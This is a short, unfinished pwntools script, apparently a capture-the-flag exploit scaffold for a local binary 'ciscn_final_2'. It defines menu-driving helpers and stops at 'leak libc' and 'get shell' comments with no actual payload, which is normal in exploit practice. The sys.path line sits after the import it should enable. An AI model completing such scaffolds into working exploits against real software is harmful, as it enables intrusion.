#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *
sys.path.append('/home/railgun/Desktop/LibcSearcher/')

p = process('./ciscn_final_2')

def menu(choice):
	p.recvuntil('which command?\n> ')
	p.sendline(str(choice))

def add(types,number):
	menu(1)
	p.recvuntil('2: short int\n>')
	p.sendline(str(types))
	p.recvuntil('your inode number:')
	p.sendline(number)

def delete(types):
	menu(2)
	p.recvuntil('2: short int\n>')
	p.sendline(str(types))

def show(types):
	menu(3)
	p.recvuntil('2: short int\n>')
	p.sendline(str(types))

def bye(content):
	menu(4)
	p.recvuntil('what do you want to say at last? \n')
	p.sendline(content)


###leak libc###
add(1,10)
add(2,10)


gdb.attach(p)
###get shell###
p.interactive()
